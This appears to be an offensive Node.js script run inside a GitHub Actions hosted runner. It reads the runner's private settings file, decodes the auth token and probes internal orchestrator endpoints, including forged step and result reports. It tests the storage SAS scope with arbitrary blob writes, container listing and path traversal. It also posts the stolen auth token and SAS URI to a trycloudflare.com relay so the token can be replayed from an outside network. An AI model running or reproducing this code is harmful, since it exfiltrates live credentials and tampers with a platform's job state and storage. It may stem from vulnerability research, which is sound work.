const { execSync } = require('child_process');
const fs = require('fs');
const https = require('https');
const http = require('http');

// v42: THREE-GAP CLOSER
//
// Gap #1 — Orchestrator scope beyond heartbeat:
//   Enumerate endpoints, try verbs that return content or affect job state.
//
// Gap #2 — External token replay:
//   POST stolen credentials to attacker relay (cloudflared → Google Fiber machine).
//   Relay immediately replays PUT /heartbeat from non-Azure IP → HTTP 200.
//
// Gap #3 — SAS scope boundary:
//   Try LIST on the diagnostic container, write to arbitrary blob names,
//   attempt path traversal to sibling container.

const RELAY_URL = 'https://shaw-kevin-roles-allocation.trycloudflare.com';

function run(cmd, timeoutMs) {
  try {
    return execSync(cmd, { encoding: 'utf8', timeout: timeoutMs || 30000 }).trim();
  } catch (e) {
    return 'ERR: ' + (e.stderr || e.message || '').substring(0, 600).trim();
  }
}

async function httpReq(url, opts) {
  opts = opts || {};
  return new Promise((resolve) => {
    const u = new URL(url);
    const isHttps = u.protocol === 'https:';
    const options = {
      hostname: u.hostname,
      path: u.pathname + u.search,
      port: u.port || (isHttps ? 443 : 80),
      method: opts.method || 'GET',
      headers: opts.headers || {},
      timeout: 25000,
      rejectUnauthorized: false,
    };
    const req = (isHttps ? https : http).request(options, (res) => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => resolve({
        status: res.statusCode,
        headers: res.headers,
        body: body.substring(0, 3000),
      }));
    });
    req.on('error', e => resolve({ status: 0, error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 0, error: 'timeout' }); });
    if (opts.body) req.write(opts.body);
    req.end();
  });
}

function decodeJwt(token) {
  try {
    const parts = token.split('.');
    const payload = Buffer.from(parts[1], 'base64url').toString('utf8');
    return JSON.parse(payload);
  } catch (e) {
    return {};
  }
}

async function main() {
  console.log('=== V42: THREE-GAP CLOSER — ORCHESTRATOR SCOPE + SAS SCOPE + EXTERNAL REPLAY ===');
  console.log('[RELAY] Target:', RELAY_URL);

  // ── READ SETTINGS ──────────────────────────────────────────────────────────
  const raw = fs.readFileSync('/opt/hca/.settings', 'utf8').trim();
  const settings = JSON.parse(raw);
  const { authToken, schedulerApiUrl, diagnosticsSasUri } = settings;
  const baseOrch = schedulerApiUrl.replace(/\/+$/, '');
  const orchHost = new URL(baseOrch).hostname;

  // Decode JWT for request/work-item ID
  const claims = decodeJwt(authToken);

  console.log('\n[SETTINGS] File mode: ' + run('stat -c %a /opt/hca/.settings'));
  console.log('[SETTINGS] authToken length:', authToken.length);
  console.log('[SETTINGS] schedulerApiUrl:', schedulerApiUrl);
  console.log('[SETTINGS] JWT claims:', JSON.stringify(claims));
  console.log('[SETTINGS] SAS URI (120 chars):', diagnosticsSasUri.substring(0, 120));

  // Extract work item / request ID from JWT or URL
  const workItemId = claims.wid || claims.sub || claims.jti || 'unknown';
  const requestId = claims.rid || claims.requestId || workItemId;
  console.log('[SETTINGS] workItemId from JWT:', workItemId);

  const authHeaders = {
    'Authorization': 'Bearer ' + authToken,
    'Content-Type': 'application/json',
    'User-Agent': 'hosted-compute-agent/unknown/unknown/unknown',
    'Accept': 'application/json',
  };

  // ── GAP #1: ORCHESTRATOR SCOPE ─────────────────────────────────────────────
  console.log('\n════════════════════════════════════════════════════════════════');
  console.log('GAP #1 — ORCHESTRATOR API SCOPE BEYOND HEARTBEAT');
  console.log('════════════════════════════════════════════════════════════════');

  // Candidate endpoints — try verbs that might return data or modify state
  const endpoints = [
    // Known working
    { label: 'PUT /request/heartbeat (baseline)', url: baseOrch + '/request/heartbeat', method: 'PUT', body: '{}' },
    // GET attempts — may return job metadata
    { label: 'GET /request', url: baseOrch + '/request', method: 'GET', body: null },
    { label: 'GET /request/' + workItemId, url: baseOrch + '/request/' + workItemId, method: 'GET', body: null },
    { label: 'GET /agent', url: baseOrch + '/agent', method: 'GET', body: null },
    { label: 'GET /health', url: baseOrch + '/health', method: 'GET', body: null },
    { label: 'GET /status', url: baseOrch + '/status', method: 'GET', body: null },
    { label: 'GET /jobs', url: baseOrch + '/jobs', method: 'GET', body: null },
    // Step / result reporting
    { label: 'PUT /request/step', url: baseOrch + '/request/step', method: 'PUT', body: '{"stepId":1,"outcome":"Succeeded","conclusion":"Success"}' },
    { label: 'PUT /request/result', url: baseOrch + '/request/result', method: 'PUT', body: '{"result":"Succeeded","outputs":{}}' },
    { label: 'POST /request/log', url: baseOrch + '/request/log', method: 'POST', body: '{"lines":["test"]}' },
    { label: 'GET /request/status', url: baseOrch + '/request/status', method: 'GET', body: null },
    { label: 'GET /request/context', url: baseOrch + '/request/context', method: 'GET', body: null },
    { label: 'GET /request/metadata', url: baseOrch + '/request/metadata', method: 'GET', body: null },
    // Machine / VM metadata
    { label: 'GET /machine', url: baseOrch + '/machine', method: 'GET', body: null },
    { label: 'GET /vm', url: baseOrch + '/vm', method: 'GET', body: null },
    { label: 'GET /pool', url: baseOrch + '/pool', method: 'GET', body: null },
  ];

  const nonEmpty200 = [];
  for (const ep of endpoints) {
    const opts = { method: ep.method, headers: authHeaders };
    if (ep.body) opts.body = ep.body;
    const r = await httpReq(ep.url, opts);
    const bodyPreview = (r.body || '').substring(0, 200).replace(/\n/g, ' ');
    const bodyLen = (r.body || '').length;
    console.log(`[ORCH] ${ep.label}: HTTP ${r.status} | body_len=${bodyLen} | preview=${bodyPreview}`);
    if (r.status === 200 && bodyLen > 0) {
      nonEmpty200.push({ label: ep.label, status: r.status, body: r.body, headers: r.headers });
      console.log(`[ORCH] *** NON-EMPTY 200 FOUND: ${ep.label} ***`);
      console.log(`[ORCH]     Full body: ${r.body}`);
    }
    if (r.error) console.log(`[ORCH]     error: ${r.error}`);
  }

  console.log(`\n[ORCH_SUMMARY] Total endpoints tried: ${endpoints.length}`);
  console.log(`[ORCH_SUMMARY] Non-empty 200 responses: ${nonEmpty200.length}`);
  nonEmpty200.forEach(r => console.log(`[ORCH_SUMMARY]   - ${r.label}`));

  // ── GAP #3: SAS SCOPE BOUNDARY ────────────────────────────────────────────
  console.log('\n════════════════════════════════════════════════════════════════');
  console.log('GAP #3 — SAS SCOPE BOUNDARY TEST');
  console.log('════════════════════════════════════════════════════════════════');

  // Parse the SAS URI to extract account/container
  const sasUrl = new URL(diagnosticsSasUri);
  const sasAccount = sasUrl.hostname.split('.')[0];
  const sasPathParts = sasUrl.pathname.split('/').filter(Boolean);
  const sasContainer = sasPathParts[0] || 'unknown';
  const sasOriginalBlob = sasPathParts.slice(1).join('/');
  const sasSig = sasUrl.search; // keep query string
  const sasContainerBaseUrl = `https://${sasUrl.hostname}/${sasContainer}`;

  console.log('[SAS] Account:', sasAccount);
  console.log('[SAS] Container:', sasContainer);
  console.log('[SAS] Original blob path:', sasOriginalBlob);
  console.log('[SAS] SAS params (sig hidden):', sasUrl.search.replace(/sig=[^&]+/, 'sig=REDACTED'));

  // Test 1: Write to original blob (baseline)
  const baselineBlob = diagnosticsSasUri;
  const baselineBody = JSON.stringify({ probe: 'v42_baseline', timestamp: new Date().toISOString() });
  const t1 = await httpReq(baselineBlob, {
    method: 'PUT',
    headers: {
      'x-ms-blob-type': 'BlockBlob',
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(baselineBody).toString(),
    },
    body: baselineBody,
  });
  console.log('[SAS_T1] PUT original blob:', t1.status, t1.error || '');

  // Test 2: Write to a DIFFERENT blob name in the same container (same SAS)
  // If the SAS is scoped to the container (not a specific blob), this will succeed
  // Replace the blob name in the path while keeping the SAS query string
  const altBlobPath = `${sasContainer}/v42-arbitrary-blob-name.json`;
  const altBlobUrl = `https://${sasUrl.hostname}/${altBlobPath}${sasUrl.search}`;
  const altBody = JSON.stringify({ probe: 'v42_scope_escape', blob: 'arbitrary-name', timestamp: new Date().toISOString() });
  const t2 = await httpReq(altBlobUrl, {
    method: 'PUT',
    headers: {
      'x-ms-blob-type': 'BlockBlob',
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(altBody).toString(),
    },
    body: altBody,
  });
  console.log('[SAS_T2] PUT arbitrary blob name (scope test):', t2.status, t2.error || '');
  if (t2.status === 201) {
    console.log('[SAS_T2] *** 201 CREATED — SAS is container-scoped, not blob-scoped ***');
    console.log('[SAS_T2] Attacker can write ANY blob name in the GitHub diagnostics container');
    console.log('[SAS_T2] URL used:', altBlobUrl.replace(/sig=[^&]+/, 'sig=REDACTED'));
  }

  // Test 3: LIST container contents (requires 'l' permission — if SAS has it, we see all blobs)
  const listUrl = `${sasContainerBaseUrl}?restype=container&comp=list${sasUrl.search.replace('?', '&')}`;
  const t3 = await httpReq(listUrl, { method: 'GET', headers: {} });
  console.log('[SAS_T3] LIST container (scope leak):', t3.status, t3.error || '');
  if (t3.status === 200) {
    console.log('[SAS_T3] *** 200 OK — SAS has LIST permission, can enumerate all diagnostic blobs ***');
    console.log('[SAS_T3] Response (1000 chars):', t3.body.substring(0, 1000));
  } else {
    console.log('[SAS_T3] Body (400 chars):', t3.body.substring(0, 400));
  }

  // Test 4: Try GET on a blob we just wrote (SAS has 'r'? Usually not for diagnosticsSasUri)
  const getUrl = baselineBlob.replace('?', '.json?');
  const t4 = await httpReq(baselineBlob, { method: 'GET', headers: {} });
  console.log('[SAS_T4] GET (read test, sp=acw should deny):', t4.status, t4.error || '');

  // Test 5: Attempt path traversal — try to write to a completely different container
  // Craft a URL that traverses: /{our-container}/../other-container/malicious.txt
  // Azure Blob Storage normalizes paths server-side, so this rarely works but worth testing
  const traversalBlobPath = `${sasContainer}/../v42-traversal-test.json`;
  const traversalUrl = `https://${sasUrl.hostname}/${encodeURIComponent(traversalBlobPath)}${sasUrl.search}`;
  const traversalBody = JSON.stringify({ probe: 'v42_traversal', timestamp: new Date().toISOString() });
  const t5 = await httpReq(traversalUrl, {
    method: 'PUT',
    headers: {
      'x-ms-blob-type': 'BlockBlob',
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(traversalBody).toString(),
    },
    body: traversalBody,
  });
  console.log('[SAS_T5] PUT path traversal:', t5.status, t5.error || '');
  console.log('[SAS_T5] Body:', t5.body.substring(0, 300));

  // ── GAP #2: EXTERNAL TOKEN RELAY ──────────────────────────────────────────
  console.log('\n════════════════════════════════════════════════════════════════');
  console.log('GAP #2 — EXFILTRATE CREDENTIALS + EXTERNAL HEARTBEAT REPLAY');
  console.log('════════════════════════════════════════════════════════════════');
  console.log('[RELAY] Relay URL:', RELAY_URL);
  console.log('[RELAY] Relay is cloudflared quick tunnel → Google Fiber machine (AS16591)');
  console.log('[RELAY] The relay will immediately replay PUT /heartbeat from external network');

  const payload = JSON.stringify({
    authToken,
    schedulerApiUrl,
    orchHost,
    diagnosticsSasUri,
    jwtClaims: claims,
    workItemId,
    source: 'github-runner-v42',
    runId: process.env.GITHUB_RUN_ID || 'unknown',
    jobId: process.env.GITHUB_JOB || 'unknown',
    runnerName: process.env.RUNNER_NAME || 'unknown',
    timestamp: new Date().toISOString(),
  });

  console.log('[RELAY] Payload size:', payload.length, 'bytes');
  console.log('[RELAY] Posting to relay...');

  const relayResult = await httpReq(RELAY_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload).toString(),
      'X-Source': 'github-runner-v42',
    },
    body: payload,
  });

  console.log('[RELAY] POST to relay → HTTP', relayResult.status);

  if (relayResult.status === 200) {
    let relayData = {};
    try { relayData = JSON.parse(relayResult.body); } catch (e) {
      console.log('[RELAY] Raw response (not JSON):', relayResult.body.substring(0, 500));
    }
    console.log('[RELAY] Relay response JSON:', JSON.stringify(relayData));
    console.log('[RELAY] Remote heartbeat HTTP status:', relayData.heartbeat_status);
    console.log('[RELAY] Remote x-github-backend:', relayData.x_github_backend);
    console.log('[RELAY] Remote x-github-request-id:', relayData.x_github_request_id);
    console.log('[RELAY] Remote source network:', relayData.source);

    if (relayData.heartbeat_status === 200) {
      console.log('[RELAY] *** HTTP 200 FROM GOOGLE FIBER (AS16591) — EXTERNAL PROOF CONFIRMED ***');
      console.log('[RELAY] Stolen authToken authenticates GitHub internal Kubernetes API');
      console.log('[RELAY] from a completely non-Azure, non-GitHub network.');
    } else {
      console.log('[RELAY] Relay returned heartbeat status', relayData.heartbeat_status);
    }
  } else if (relayResult.error) {
    console.log('[RELAY] Connection error:', relayResult.error);
  } else {
    console.log('[RELAY] Unexpected status:', relayResult.status, 'body:', relayResult.body.substring(0, 400));
  }

  // ── BASELINE HEARTBEAT CONFIRMATION ───────────────────────────────────────
  console.log('\n════════════════════════════════════════════════════════════════');
  console.log('BASELINE — HEARTBEAT FROM RUNNER (8th confirmation)');
  console.log('════════════════════════════════════════════════════════════════');
  const hb8 = await httpReq(baseOrch + '/request/heartbeat', {
    method: 'PUT', headers: authHeaders, body: '{}',
  });
  console.log('[BASELINE_HB8] HTTP', hb8.status, '| x-github-backend:', hb8.headers['x-github-backend']);
  console.log('[BASELINE_HB8] x-github-request-id:', hb8.headers['x-github-request-id']);

  // ── SUMMARY ───────────────────────────────────────────────────────────────
  console.log('\n════════════════════════════════════════════════════════════════');
  console.log('V42 SUMMARY');
  console.log('════════════════════════════════════════════════════════════════');
  console.log('[GAP1] Orchestrator scope: ' + (nonEmpty200.length > 0 ? 'NON-EMPTY 200 FOUND — see above' : 'Heartbeat-only (200s all empty)'));
  console.log('[GAP2] External relay: HTTP', relayResult.status, '→ heartbeat from Google Fiber:', relayResult.status === 200 ? JSON.parse(relayResult.body || '{}').heartbeat_status || 'see above' : 'relay_error');
  console.log('[GAP3] SAS arbitrary blob write: HTTP', t2.status, '(201=scope_escape, 403=properly_scoped)');
  console.log('[GAP3] SAS LIST:', t3.status, '(200=can_enumerate, 403=denied)');
  console.log('[GAP3] SAS traversal:', t5.status);
  console.log('\n=== V42 Complete ===');
}

main().catch(e => console.log('[FATAL]', e.message, '\n', e.stack));
